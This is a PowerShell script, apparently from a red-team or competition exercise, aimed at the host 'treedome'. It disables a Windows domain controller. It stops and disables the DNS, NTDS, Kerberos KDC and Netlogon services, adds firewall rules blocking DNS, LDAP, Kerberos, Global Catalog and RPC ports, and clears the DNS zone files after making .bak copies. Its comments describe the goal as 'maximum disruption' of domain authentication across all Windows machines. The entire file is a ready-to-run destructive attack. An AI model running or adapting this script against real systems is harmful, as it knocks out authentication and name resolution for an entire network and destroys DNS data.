# treedome (10.111.2.1) - AD/DNS disruption
# Targets Active Directory Domain Services (NTDS) and DNS Server service
# WARNING: AD is deeply integrated — stopping NTDS will cascade and affect domain auth
# across all Windows boxes. Use this for maximum disruption.

# Stop and disable DNS Server first (lower blast radius if you want partial disruption)
Stop-Service -Name "DNS" -Force -ErrorAction SilentlyContinue
Set-Service  -Name "DNS" -StartupType Disabled -ErrorAction SilentlyContinue

# Stop AD DS (NTDS) — this kills Kerberos, LDAP, domain auth
Stop-Service -Name "NTDS" -Force -ErrorAction SilentlyContinue
Set-Service  -Name "NTDS" -StartupType Disabled -ErrorAction SilentlyContinue

# Stop Kerberos Key Distribution Center
Stop-Service -Name "Kdc" -Force -ErrorAction SilentlyContinue
Set-Service  -Name "Kdc" -StartupType Disabled -ErrorAction SilentlyContinue

# Stop Netlogon (domain logon/auth)
Stop-Service -Name "Netlogon" -Force -ErrorAction SilentlyContinue
Set-Service  -Name "Netlogon" -StartupType Disabled -ErrorAction SilentlyContinue

# Block DNS ports
$rules = @(
    @{Name="Block DNS TCP"; Protocol="TCP"; Port=53},
    @{Name="Block DNS UDP"; Protocol="UDP"; Port=53}
)
foreach ($r in $rules) {
    $existing = Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue
    if (-not $existing) {
        New-NetFirewallRule -DisplayName $r.Name -Direction Inbound -Protocol $r.Protocol -LocalPort $r.Port -Action Block
    }
}

# Block LDAP/Kerberos/RPC ports used by AD
$tcpPorts = @(
    @{Name="Block AD LDAP";      Port=389},
    @{Name="Block AD LDAPS";     Port=636},
    @{Name="Block AD GC";        Port=3268},
    @{Name="Block AD GC SSL";    Port=3269},
    @{Name="Block AD Kerberos";  Port=88},
    @{Name="Block AD RPC";       Port=135}
)
foreach ($r in $tcpPorts) {
    $existing = Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue
    if (-not $existing) {
        New-NetFirewallRule -DisplayName $r.Name -Direction Inbound -Protocol TCP -LocalPort $r.Port -Action Block
    }
}

# Block Kerberos UDP
$existing = Get-NetFirewallRule -DisplayName "Block AD Kerberos UDP" -ErrorAction SilentlyContinue
if (-not $existing) {
    New-NetFirewallRule -DisplayName "Block AD Kerberos UDP" -Direction Inbound -Protocol UDP -LocalPort 88 -Action Block
}

# Corrupt the DNS zone database files (back up first)
$dnsZonesDir = "$env:SystemRoot\System32\dns"
if (Test-Path $dnsZonesDir) {
    # Back up all zone files
    $zoneFiles = Get-ChildItem "$dnsZonesDir\*.dns" -ErrorAction SilentlyContinue
    foreach ($f in $zoneFiles) {
        Copy-Item $f.FullName "$($f.FullName).bak" -ErrorAction SilentlyContinue
        # Wipe the zone file contents — DNS can't serve the zone
        Clear-Content $f.FullName -ErrorAction SilentlyContinue
    }
}

Write-Host "[*] AD/DNS disruption complete on treedome"
Write-Host "[!] Note: NTDS stop may take 30-60s and will affect all domain-joined boxes"
